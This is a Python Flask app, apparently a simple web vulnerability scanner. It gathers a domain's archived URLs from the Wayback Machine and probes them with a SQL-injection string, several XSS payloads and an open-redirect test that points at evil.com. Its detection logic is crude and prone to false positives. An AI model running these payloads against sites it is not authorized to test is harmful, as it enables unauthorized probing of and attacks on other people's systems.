import requests
import re
import aiohttp
import asyncio
import time
import os
from concurrent.futures import ThreadPoolExecutor
from aiohttp import ClientSession, ClientTimeout
from tqdm import tqdm
from colorama import Fore, Style, init
import logging
import aiofiles
from flask import Flask, request, jsonify, send_from_directory

# Initialize Flask app
app = Flask(__name__)

# Initialize colorama for colored terminal output
init(autoreset=True)

# Set up logging for error handling
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Asynchronous fetch for URLs from Wayback Machine
async def fetch_wayback_urls(domain, max_urls, retries=3, delay=5):
    logging.info(Fore.CYAN + "[+] Fetching URLs from Wayback Machine...")
    wayback_api = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey"
    
    async with ClientSession(timeout=ClientTimeout(total=10)) as session:
        for attempt in range(retries):
            try:
                async with session.get(wayback_api) as response:
                    if response.status == 200:
                        data = await response.json()
                        all_urls = [item[0] for item in data[1:]]
                        
                        # Regex to filter URLs for testing
                        regex = re.compile(r".*[\?&].*=.*|.*\.(php|asp|aspx|jsp)$|[\?&](redirect|url|r)=http", re.IGNORECASE)
                        valid_urls = {url for url in all_urls if regex.search(url)}
                        
                        # Filter out URLs with encoded characters and unnecessary parts
                        final_urls = {url for url in valid_urls if not re.search(r"%[0-9A-Fa-f]{2}", url) and "FUZZ" not in url}
                        return list(final_urls)[:max_urls]
            except asyncio.TimeoutError:
                logging.error(Fore.RED + f"Timeout error fetching URLs (Attempt {attempt + 1}). Retrying...")
            except Exception as e:
                logging.error(Fore.RED + f"Error fetching URLs: {e}")
            
            if attempt < retries - 1:
                logging.info(Fore.YELLOW + f"Retrying in {delay} seconds...")
                await asyncio.sleep(delay)
    
    logging.error(Fore.RED + "Failed to fetch Wayback URLs after multiple attempts.")
    return []

# Optimized SQL Injection Detection with False Positive Fix
def check_sql_injection(url):
    # Ignore URLs containing "redir.php?=" or any variant (e.g., "?r=")
    if re.search(r"redir\.php\?r=", url, re.IGNORECASE):
        return False
    
    try:
        test_payload = "' OR '1'='1"
        response = requests.get(url + test_payload, timeout=3)
        return "error" in response.text.lower() or "sql" in response.text.lower()
    except requests.RequestException:
        return False

# Optimized XSS Detection with Multiple Payloads
def check_xss(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<a href='javascript:alert(1)'>Click me</a>"
    ]
    for payload in payloads:
        try:
            response = requests.get(url + payload, timeout=3)
            if payload in response.text:
                return True
        except requests.RequestException:
            continue
    return False

# Optimized Open Redirect Detection
def check_open_redirect(url):
    try:
        redirect_payload = "http://evil.com"
        redirect_url = re.sub(r"(redirect|url|r)=.*", rf"\1={redirect_payload}", url, flags=re.IGNORECASE)
        response = requests.get(redirect_url, timeout=3, allow_redirects=True)
        if redirect_payload in response.url:
            return True
    except requests.RequestException:
        return False
    return False

# Optimized URL Scanning using ThreadPoolExecutor for parallel checks
def scan_urls(urls):
    sql_vulnerable_urls = []
    xss_vulnerable_urls = []
    redirect_vulnerable_urls = []
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = list(tqdm(executor.map(scan_url, urls), total=len(urls), desc="Scanning URLs", ncols=100))
        
        for result in results:
            url, sql_vulnerable, xss_vulnerable, redirect_vulnerable = result
            if sql_vulnerable:
                sql_vulnerable_urls.append(url)
            if xss_vulnerable:
                xss_vulnerable_urls.append(url)
            if redirect_vulnerable:
                redirect_vulnerable_urls.append(url)
    
    return sql_vulnerable_urls, xss_vulnerable_urls, redirect_vulnerable_urls

# Scan URL for vulnerabilities (SQL, XSS, Open Redirect)
def scan_url(url):
    sql_vulnerable = check_sql_injection(url)
    xss_vulnerable = check_xss(url)
    redirect_vulnerable = check_open_redirect(url)
    return url, sql_vulnerable, xss_vulnerable, redirect_vulnerable

# Flask routes
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/styles.css')
def styles():
    return send_from_directory('.', 'styles.css')

@app.route('/scan', methods=['POST'])
async def scan():
    data = request.json
    domain = data.get('domain')
    max_urls = int(data.get('max_urls', 100))

    if not domain:
        return jsonify({'error': 'Domain is required'}), 400

    urls = await fetch_wayback_urls(domain, max_urls)
    if not urls:
        return jsonify({
            'sql': [],
            'xss': [],
            'redirect': []
        })

    sql_vulnerable_urls, xss_vulnerable_urls, redirect_vulnerable_urls = scan_urls(urls)
    
    return jsonify({
        'sql': sql_vulnerable_urls,
        'xss': xss_vulnerable_urls,
        'redirect': redirect_vulnerable_urls
    })

# Run the Flask app
if __name__ == "__main__":
    app.run(debug=True, port=5000)
